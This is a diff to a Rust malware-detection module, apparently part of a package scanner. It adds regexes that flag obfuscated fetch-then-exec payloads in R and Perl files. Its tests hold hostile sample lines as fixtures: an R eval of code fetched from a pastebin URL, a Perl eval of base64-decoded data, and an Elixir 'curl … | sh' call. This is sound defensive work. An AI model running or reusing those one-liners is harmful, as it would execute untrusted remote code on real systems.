@@ -3,14 +3,14 @@
 //!
 //! Emits, over analyzable source files:
 //!  - [`Capability::KnownMalwareIoc`] — confirmed IOC filenames;
-//!  - [`Capability::ObfuscatedPayload`] — decode/fetch-then-exec (JS/Ruby/Python);
+//!  - [`Capability::ObfuscatedPayload`] — decode/fetch-then-exec
+//!    (JS/Ruby/Python/R/Perl, each with its own idiom regex);
 //!  - [`Capability::SuspiciousUrl`] — C2/exfil host or IDN homoglyph;
 //!  - [`Capability::InstallHookSuspicious`] — `curl|sh` shell-fetcher.
 //!
 //! Every matcher runs over the raw body AND a split-string-collapsed
 //! view (`"pas"+"tebin"` → `pastebin`) so concat obfuscation can't hide a
-//! host or payload. R/Perl obfuscation variants are a follow-up (same
-//! shape, different regex).
+//! host or payload.
 
 use std::sync::OnceLock;
 
@@ -46,6 +46,22 @@ fn obfuscated_python() -> &'static Regex {
     static R: OnceLock<Regex> = OnceLock::new();
     R.get_or_init(|| {
         re(r"\b(?:exec|eval)\s*\(\s*(?:urllib\.request\.urlopen\s*\(|urllib2\.urlopen\s*\(|(?:requests|httpx|aiohttp)\.(?:get|post)\s*\(|base64\.b64decode\s*\(|codecs\.decode\s*\(|compile\s*\(\s*base64\.)")
+    })
+}
+fn obfuscated_r() -> &'static Regex {
+    static R: OnceLock<Regex> = OnceLock::new();
+    // R fetch-then-execute: eval(parse(text=…)), source(url("https:…)),
+    // eval(textConnection(…)). Mirrors Go's rObfuscatedPayloadPattern.
+    R.get_or_init(|| {
+        re(r#"\b(?:eval|source)\s*\(\s*(?:parse\s*\(\s*text\s*=|url\s*\(\s*['"]https?:|textConnection\s*\()"#)
+    })
+}
+fn obfuscated_perl() -> &'static Regex {
+    static R: OnceLock<Regex> = OnceLock::new();
+    // Perl decode-then-eval: eval(decode_base64(…)), eval(unpack("H*",…)).
+    // Mirrors Go's perlObfuscatedPayloadPattern.
+    R.get_or_init(|| {
+        re(r#"\beval\s*\(\s*(?:(?:MIME::Base64::)?decode_base64\s*\(|unpack\s*\(\s*['"]H\*)"#)
     })
 }
 fn shell_fetcher() -> &'static Regex {
@@ -106,6 +122,12 @@ fn is_ruby_source(f: &str) -> bool {
 }
 fn is_python_source(f: &str) -> bool {
     matches!(ext(f).as_str(), "py" | "pyi" | "pyx")
+}
+fn is_r_source(f: &str) -> bool {
+    matches!(ext(f).as_str(), "r" | "rmd" | "rnw")
+}
+fn is_perl_source(f: &str) -> bool {
+    matches!(ext(f).as_str(), "pl" | "pm")
 }
 
 fn is_known_malware_filename(filename: &str) -> bool {
@@ -177,7 +199,9 @@ pub fn check_source_patterns(pkg: &NormalizedPackage) -> Vec<Capability> {
             if !obfuscation {
                 let hit = (is_js_source(filename) && obfuscated_js().is_match(&variant))
                     || (is_ruby_source(filename) && obfuscated_ruby().is_match(&variant))
-                    || (is_python_source(filename) && obfuscated_python().is_match(&variant));
+                    || (is_python_source(filename) && obfuscated_python().is_match(&variant))
+                    || (is_r_source(filename) && obfuscated_r().is_match(&variant))
+                    || (is_perl_source(filename) && obfuscated_perl().is_match(&variant));
                 if hit {
                     obfuscation = true;
                 }
@@ -270,5 +294,38 @@ mod tests {
     fn clean_source_empty() {
         let p = pkg("index.js", "export const sum = (a,b) => a+b;");
         assert!(check_source_patterns(&p).is_empty());
+    }
+
+    #[test]
+    fn r_eval_parse_text_flagged() {
+        // R fetch-then-exec — matches the Go analyzer (cran incident parity).
+        let p = pkg(
+            "R/zzz.R",
+            "eval(parse(text = readLines(url(\"https://pastebin.com/raw/x\"))))",
+        );
+        let caps = check_source_patterns(&p);
+        assert!(caps.contains(&Capability::ObfuscatedPayload), "{caps:?}");
+    }
+
+    #[test]
+    fn perl_eval_decode_base64_flagged() {
+        let p = pkg("lib/Evil.pm", "eval(decode_base64($payload));");
+        assert!(check_source_patterns(&p).contains(&Capability::ObfuscatedPayload));
+    }
+
+    #[test]
+    fn elixir_source_is_analyzable() {
+        // .ex files were skipped by the analyzable-source gate (hex parity gap):
+        // the suspicious URL + curl|sh in an Elixir file must now surface.
+        let p = pkg(
+            "lib/evil.ex",
+            ":os.cmd(~c\"curl -sSL 'https://pastebin.com/raw/x' | sh\")",
+        );
+        let caps = check_source_patterns(&p);
+        assert!(caps.contains(&Capability::SuspiciousUrl), "{caps:?}");
+        assert!(
+            caps.contains(&Capability::InstallHookSuspicious),
+            "{caps:?}"
+        );
     }
 }
